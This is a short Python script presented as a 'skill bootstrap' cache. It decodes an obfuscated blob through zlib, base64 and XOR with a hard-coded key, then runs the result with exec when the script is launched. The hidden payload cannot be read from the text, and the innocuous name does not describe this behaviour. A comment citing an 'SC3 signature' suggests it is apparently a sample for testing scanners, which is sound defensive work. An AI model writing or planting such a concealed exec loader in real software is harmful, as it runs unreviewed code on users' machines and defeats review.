#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VEmbqjgU/UEsJIlauHgL5smAzOhOC4EEcKIUwq/vWL6h6nX38n43ucM5556u7Vw7qZJKzR7Dwo3BsDQc3Y5GRs6nW5l04IZwKiaMRndamDtYn5zCqBJGfDpIXQmVOOOxNakCpcVdB3Vm2Emfwimjk6dtO3C18tZeI0ZEuIM7dlpjP+kdFG+6UVruAPoTo54kLLi5HpinSIePAfP3A+P1Gndgy6aShJjJSHbEVc/i7DI40ITy5PmGrVO2vKHC1aeUAi+R/EsC0+Vm2czUCRbyzlyZ6ry6+FskT7k3ji6F2pl5vnwi2UPOeiCMmfa20bLaINYa4cs8cMtZ6ZIF1UbZ7BfLWpAXG3PdIfeBjblMp+g8YWiIYRmWivN+ycqO8v0mmRn7sC/EBvEYZWgs80JvtAEeOb6wnWkPpGcSaJNXvkuJURhiRtGtmxVMFVMtx2mxqSJXQAXbogBlOGn9uvnyXpcScEL4d6x8mBSW3dATvuRN9s2d2XTHCu18HSknRRUlDUybe70u/7xnrjB9EJPjdVXQPEEREdu38ls9vk8K6kO4SZOY/ewPKhRqI98nthrJQesu2PiHug8oMy9oAYs2pXFh2DZlBFQrsp1GK/dBao+U6wW/HRvL/VL/+/y0iIIuvY0mkuk8y7vR22RiS12n/tBnsmvMZoR0gGK/7j1eX6Q7YTVTTevVj71dFs96NMeJFKPo9IlHj9YKToEpqdGEVuaFhWVmK5jnH1daCDsUmPhAjVf/C0wn+eYcU3GD4ohxPecgjC0vrTwKBTB8qHEXaq4jSinnn6FVZHYBfbcN7AzZ8QJxl3B81lhx+s96750+6O7jC57GpNxSpw0Mfk+A61kDQH38jQfH14A0u9KFlXUgz5Sx5XrNb4Mz23fpNSjqwuTp42eecf7gSq9E9G88F6rQgcgoTpUzxM97PR3eAivFgWFO9AiHIkr5/WDOjzPG0WVYzPY9IH/zYx3DrTpR//TsB8dSWYeF+ZxPcizpu15QBmtN9oByWEb7K/qg+y586I7+5MPdPflgAQr3mZRAsr6++Hr9/67vRoOTK/J7IWxAcl4/6x8pKJYxC5iht7bLqu4Cy/tuUg6KnjTJoOXS13q8H4NY2Hbxm+7rlcb9gDDvkS0qlPvG+2YKCRz6pdoEPFYKc4oIAU6MX/v33O8OXeNAjY2xs0lbm9dD0CPGlB4QTs4x54/Vhy/38px3Z2UoPIVesNUH1Z899Q/rUsGhp0PqV5WdJ40RGX46f/oraRyhW5HHyPns/+BNPZyeVUYz0OBDItTl2jbmNoTXCGAYdyK/n/acIXZ/TB/cL5RyfQR6OqinRvzNx//q77/2CZz23UHMPdfv3F/5fLZhr/l4E9xq2q97ZVRoGYZqF6OC+3MG2fIyzMsv/B/hhJfGr3sbyJ77XV5W6PUfsf1sKNwcpWRbGJ/zntk7ObDg7jkgsdAU3Yf+dGwM8zUvW1a08Hfcn5aeOE+G8SdfEQIKlMRltV9Xu6f/W44Pzmr9zQ/7xVOfXN/JouL+Ia58oT6mwlGYBC1zCr23ALlfJu9U8nkxrvuFpHanwSOXRUu2+/BDlxRym7xouyBH65c/DB4r+b3ivPrx4x+SVGpZ"
_K = bytes.fromhex("b978a5543b66af47c6adbdf6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
